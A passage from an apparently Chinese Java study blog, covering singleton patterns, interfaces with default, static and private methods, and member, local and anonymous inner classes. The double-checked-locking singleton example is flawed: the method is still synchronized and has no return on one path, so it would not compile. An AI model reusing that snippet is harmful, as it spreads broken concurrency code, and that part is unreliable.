class="line">    <span class="comment">// public static synchronized Bank getInstance() &#123;</span></span><br><span class="line">    <span class="comment">//     if(instance == null)&#123;</span></span><br><span class="line">    <span class="comment">//         instance = new Bank();</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     return instance;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//方式2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Bank <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(Bank.class)&#123;</span><br><span class="line">            <span class="keyword">if</span>(instance == <span class="literal">null</span>)&#123;</span><br><span class="line">                instance = <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//方式2的优化之方式3 更高效率（存在指令重排的问题，添加volatile关键字即可）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Bank <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Bank.class)&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance == <span class="literal">null</span>)&#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="模板设计模式"><a href="#模板设计模式" class="headerlink" title="模板设计模式"></a>模板设计模式</h4><p>抽象类的应用就是一种模板设计模式。</p>
<h3 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口 interface"></a>接口 interface</h3><p>在Java中，interface（接口）是一种引用类型，是一种抽象的类型，它是方法声明的集合。接口在Java中扮演着非常重要的角色，特别是在实现多态和定义类之间的契约时。接口定义了对象的行为规范，即对象可以做什么，而不关心这些行为是如何实现的。<br>接口的本质就是契约，标准，规范，制定后大家都需要遵守，针对“特性”的编程.</p>
<p>接口是一种规范，<em>必须要有具体实现此规范的类</em>，其中规定了方法的参数列表，方法名和返回值和其他信息。</p>
<h4 id="接口的定义"><a href="#接口的定义" class="headerlink" title="接口的定义"></a>接口的定义</h4><p>接口内部结构的说明：<br>可以声明：</p>
<ul>
<li>属性：必须使用public,static,final修饰</li>
<li>方法：</li>
</ul>
<ul>
<li>jdk8&lt; 声明抽象方法，修饰为public abstract</li>
<li>&gt;&#x3D;jdk8 声明静态方法，默认方法</li>
<li>&gt;&#x3D;jdk9 声明私有方法<br>不可以声明构造器，代码块等</li>
</ul>
<p>类和接口的关系：实现关系，类中实现接口的具体功能<br>接口与接口的关系：存在继承关系(多继承)<br>接口的多态性：接口名 变量名 &#x3D; new 实现类对象。<br>格式：class A extends superA implement B,C{}</p>
<p>接口的实现：四种基本写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">USBTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建接口实现类的对象 -- 标准写法</span></span><br><span class="line">        <span class="type">Computer</span> <span class="variable">computer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Computer</span>();</span><br><span class="line">        <span class="type">Printer</span> <span class="variable">printer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Printer</span>();</span><br><span class="line">        <span class="comment">//接口的多态Printer-&gt;USB</span></span><br><span class="line">        computer.transferData(printer);</span><br><span class="line"></span><br><span class="line">         <span class="comment">//2.创建接口实现类的匿名对象</span></span><br><span class="line">        computer.transferData(<span class="keyword">new</span> <span class="title class_">Printer</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.创建接口匿名实现类的对象</span></span><br><span class="line">        <span class="type">USB</span> <span class="variable">usb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">USB</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;U盘开始工作&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;U盘工作结束&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">         computer.transferData(usb); </span><br><span class="line">            </span><br><span class="line">         <span class="comment">//4.创建接口匿名实现类的匿名对象</span></span><br><span class="line">         computer.transferData(<span class="keyword">new</span> <span class="title class_">USB</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;扫描仪开始工作&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;扫描仪工作结束&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Computer</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transferData</span><span class="params">(USB usb)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;设备启动&quot;</span>);</span><br><span class="line">        usb.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;数据传输等操作&quot;</span>);</span><br><span class="line">        usb.stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span>  <span class="title class_">Printer</span> <span class="keyword">implements</span> <span class="title class_">USB</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打印机开始工作&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打印机工作结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">USB</span>&#123;</span><br><span class="line">    <span class="comment">//声明常量</span></span><br><span class="line">    <span class="comment">//USB的长宽高等</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span>;<span class="comment">//默认省略了public abstract前缀，前者也可以省略为void start();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>说明：</p>
<ul>
<li>类可以实现多个接口</li>
<li>类针对接口的多实现弥补了类的单继承局限性。</li>
<li>类必须将实现的接口中的所有抽象方法都重写，方可实例化，否则需要声明为抽象类</li>
</ul>
<p>接口与抽象类：</p>
<ol>
<li>都可以声明抽象方法，都不能实例化</li>
<li>抽象类一定有构造器，接口没有构造器</li>
<li>类与抽象类是继承关系，类与接口是实现关系，接口与接口可能存在多继承(也可以用instanceof)关系</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240707194543.png" alt="接口与抽象类"></p>
<h4 id="拓展接口"><a href="#拓展接口" class="headerlink" title="拓展接口"></a>拓展接口</h4><p>jdk8后可以声明静态方法，默认方法；jdk9后可以声明私有方法</p>
<p>说明：</p>
<ol>
<li>接口内实现的静态方法只能通过接口.方法调用，不能使用其实现类进行调用</li>
<li>接口中声明的默认方法可以被实现类继承，实现类没有重写此方法时默认调用接口中的方法，若重写默认调用实现类中的方法</li>
<li>类实现的多个接口中若定义了多个同名同参的默认方法，而实现类中没有重写，会导致接口冲突报错&#x3D;&#x3D;》实现类必须重写多接口中同名同参的方法</li>
<li>子类(或实现类)继承了父类并实现了接口，父类和接口中实现了同名同参的方法（其中接口中的是默认方法），优先（没有重写的情况下）调用父类中的方法 &#x3D;&#x3D;》类优先原则</li>
<li>在子类（或实现类）中调用父类或接口中被重写的方法：（被当前类实现的）接口名.super.（被重写的）方法</li>
</ol>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">USB</span>&#123;</span><br><span class="line">    <span class="comment">//声明常量</span></span><br><span class="line">    <span class="comment">//USB的长宽高等</span></span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span>;<span class="comment">//默认省略了public abstract前缀，前者也可以省略为void start();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">defaultMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;default method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">privateMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;private method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<h2 id="拓展-常用类"><a href="#拓展-常用类" class="headerlink" title="拓展-常用类"></a>拓展-常用类</h2><h3 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h3><p>内部类（Inner Class）是Java编程语言中的一个特性，它允许将一个类的定义放在另一个类的内部。例如Thread类内部声明了State类来表示线程的生命周期。<br>内部类可以是静态的（static），也可以是非静态的（non-static）。静态内部类与非静态内部类的主要区别在于它们如何与外围类（即包含它们的类）相关联。</p>
<p>内部类的分类：</p>
<ul>
<li>成员内部类，直接声明在外部类的里面<ul>
<li>使用static修饰的静态成员内部类</li>
<li>不使用static修饰的非静态成员内部类</li>
</ul>
</li>
<li>局部内部类，声明在方法、构造器、代码块内的内部类<ul>
<li>匿名局部内部类</li>
<li>非匿名局部内部类<br>示例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;<span class="comment">//外部类</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">        <span class="comment">//静态成员内部类</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Bird</span>&#123;</span><br><span class="line">        <span class="comment">//非静态成员内部类</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Innerclass</span>&#123;</span><br><span class="line">            <span class="comment">//局部内部类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
编写一个匿名内部类，它继承Object，并在匿名内部类中，声明一个方法public void test()打印<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240707212304.png" alt="内部类重要示例"></li>
</ul>
</li>
</ul>
<h4 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h4><p>成员内部类的理解</p>
<ol>
<li>从类的角度<ul>
<li>内部可以声明属性方法构造器代码块内部类等结构</li>
<li>可以声明父类，可以实现接口</li>
<li>可以使用final，abstract修饰</li>
</ul>
</li>
<li>从成员的角度<ul>
<li>内部可以调用外部类的结构</li>
<li>可以使用所有权限修饰符和static</li>
</ul>
</li>
</ol>
<p>成员内部类的实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//1. 创建Person的静态的成员内部类的实例</span></span><br><span class="line">    Person.<span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>.Dog();</span><br><span class="line">    <span class="comment">//2. 创建Person的非静态的成员内部类的实例</span></span><br><span class="line">    <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    Person.<span class="type">Bird</span> <span class="variable">bird</span> <span class="operator">=</span> person.<span class="keyword">new</span> <span class="title class_">Bird</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成员内部类内部调用外部类的结构</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;<span class="comment">//外部类</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;SillyBoy&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Bird</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;杜鹃&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;outer class Person age = &quot;</span>+ age);<span class="comment">//不重名默认省略Person.this</span></span><br><span class="line">            System.out.println(<span class="string">&quot;outer class Person name = &quot;</span> + Person.<span class="built_in">this</span>.name);</span><br><span class="line">            System.out.println(<span class="string">&quot;inner class Bird name = &quot;</span> + <span class="built_in">this</span>.name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//非静态成员内部类</span></span><br><span class="line">        <span class="comment">//调用外部方法等同理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240707211700.png" alt="局部内部类主要应用"><br>非匿名局部内部类</p>
<p>语法格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[修饰符] class 外部类&#123;</span><br><span class="line">    [修饰符] 返回值类型  方法名(形参列表)&#123;</span><br><span class="line">            [<span class="keyword">final</span>/<span class="keyword">abstract</span>] class 内部类&#123;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编译后有自己的独立的字节码文件，只不过在内部类名前面冠以外部类名、$符号、编号。<ul>
<li>这里有编号是因为同一个外部类中，不同的方法中存在相同名称的局部内部类</li>
</ul>
</li>
</ul>
<ul>
<li>和成员内部类不同的是，它前面不能有权限修饰符等</li>
<li>局部内部类如同局部变量一样，有作用域</li>
<li>局部内部类中是否能访问外部类的非静态的成员，取决于所在的方法</li>
</ul>
<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLocalInner</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Outer.outMethod();</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Outer</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        out.outTest();</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Runner</span> <span class="variable">runner</span> <span class="operator">=</span> Outer.getRunner();</span><br><span class="line">        runner.run();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">outMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Outer.outMethod&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&quot;局部变量c&quot;</span>;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inMethod</span><span class="params">()</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Inner.inMethod&quot;</span>);</span><br><span class="line">                System.out.println(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        in.inMethod();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">outTest</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inMethod1</span><span class="params">()</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Inner.inMethod1&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        in.inMethod1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Runner <span class="title function_">getRunner</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">LocalRunner</span> <span class="keyword">implements</span> <span class="title class_">Runner</span>&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;LocalRunner.run&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LocalRunner</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Runner</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>匿名内部类</p>
<p>因为考虑到这个子类或实现类是一次性的，那么我们“费尽心机”的给它取名字，就显得多余。那么我们完全可以使用匿名内部类的方式来实现，避免给类命名的问题。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 父类([实参列表])&#123;</span><br><span class="line">    重写方法...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 父接口()&#123;</span><br><span class="line">    重写方法...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>举例1：使用匿名内部类的对象直接调用方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">a</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="keyword">new</span> <span class="title class_">A</span>()&#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">()</span> &#123;</span><br><span class="line">				System.out.println(<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">    	&#125;.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>举例2：通过父类或父接口的变量多态引用匿名内部类的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">a</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="type">A</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>()&#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">()</span> &#123;</span><br><span class="line">				System.out.println(<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">    	&#125;;</span><br><span class="line">    	obj.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>举例3：匿名内部类的对象作为实参</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(A a)</span>&#123;</span><br><span class="line">    	a.method();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	test(<span class="keyword">new</span> <span class="title class_">A</span>()&#123;</span><br><span class="line"></span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">				System.out.println(<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">    	&#125;);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="理解示例"><a href="#理解示例" class="headerlink" title="理解示例"></a>理解示例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.atguigu09.inner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ClassName: OuterClassTest</span></span><br><span class="line"><span class="comment"> * Package: com.atguigu09.inner</span></span><br><span class="line"><span class="comment"> * Regulation:</span></span><br><span class="line"><span class="comment"> * 包名多单词组成时全部小写</span></span><br><span class="line"><span class="comment"> * 类名，接口名多单词组成时每个单词首字母大写</span></span><br><span class="line"><span class="comment"> * 变量，方法名多单词组成时，首个单词首字母小写，其余单词首字母大写</span></span><br><span class="line"><span class="comment"> * 常量名多单词组成每个单词使用下划线连接，全部大写</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Fu Shiye</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Create</span> 2024/7/7 20:51</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span> 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OuterClassTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//针对接口</span></span><br><span class="line">        <span class="comment">//1 标准写法 -先在外部实现接口的实现类再</span></span><br><span class="line">        <span class="type">SubA</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubA</span>();</span><br><span class="line">        a.method();</span><br><span class="line">        <span class="comment">//2 匿名实现类的有名对象</span></span><br><span class="line">        <span class="type">A</span> <span class="variable">a1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;匿名实现类的有名对象重写的方法&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        a1.method();</span><br><span class="line">        <span class="comment">//3 匿名实现类的匿名对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">A</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;匿名实现类的匿名对象重写的方法&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.method();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//针对抽象类</span></span><br><span class="line">        <span class="comment">//1,标准写法 -先在外部实现抽象类的子类再</span></span><br><span class="line">        <span class="type">subB</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">subB</span>();</span><br><span class="line">        s1.method1();</span><br><span class="line">        <span class="comment">//2,继承抽象类的匿名子类的有名对象</span></span><br><span class="line">        <span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;抽象类匿名子类的有名对象重写的方法&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        b.method1();</span><br><span class="line">        <span class="comment">//2,继承抽象类的匿名子类的匿名对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">B</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;抽象类匿名子类的匿名对象重写的方法&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.method1();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//针对普通类</span></span><br><span class="line">        <span class="comment">//1. 标准写法</span></span><br><span class="line">        <span class="type">C</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C</span>();</span><br><span class="line">        c.method2();</span><br><span class="line">        <span class="comment">//2. C的匿名子类的有名对象</span></span><br><span class="line">        <span class="type">C</span> <span 